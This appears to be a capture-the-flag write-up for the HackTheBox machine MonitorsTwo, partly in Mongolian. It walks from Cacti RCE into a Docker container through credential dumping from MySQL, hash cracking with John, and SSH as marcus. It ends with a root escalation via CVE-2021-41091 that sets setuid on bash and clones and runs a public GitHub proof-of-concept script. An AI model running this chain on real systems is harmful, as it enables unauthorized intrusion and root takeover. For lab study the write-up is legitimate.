# MonitorsTwo - Cacti / Docker's Overlay Filesystem PE

## RCE to docker container

[image]

## Found Marcus user using mysql entrypoint.sh

```bash
cat /entrypoint.sh
```

[image]

```sql
select * from user_auth;
```

[image]

## Crack the hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

[image]

## Shell as Marcus

```bash
ssh marcus@10.10.11.211
```

## See the mail log

Энэ хэсэгт CVE-2021-41091 эмзэг байдлыг дурдаж өгсөн байна. Үүгээр дамжуулан Privilege Escalation хийх боломжтой байна.

```bash
cat /var/mail/marcus
```

[image]

## Privilege Escalation

Docker container дотроо root эрхээр setuid-ийг /bin/bash-д тохируулж өгнө.

**In Docker container**

```bash
# Setuid-г ашиглан root-ээр орж байна.
capsh --gid=0 --uid=0 --

# Bash-д setuid тохируулж байна
chmod u+s /bin/bash
```

**In main machine**

```bash
git clone https://github.com/UncleJ4ck/CVE-2021-41091
cd CVE-2021-41091
chmod +x ./poc.sh
./poc.sh
```

[image]

## Root!!!

```bash
cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

./bin/bash -p
```

[image]
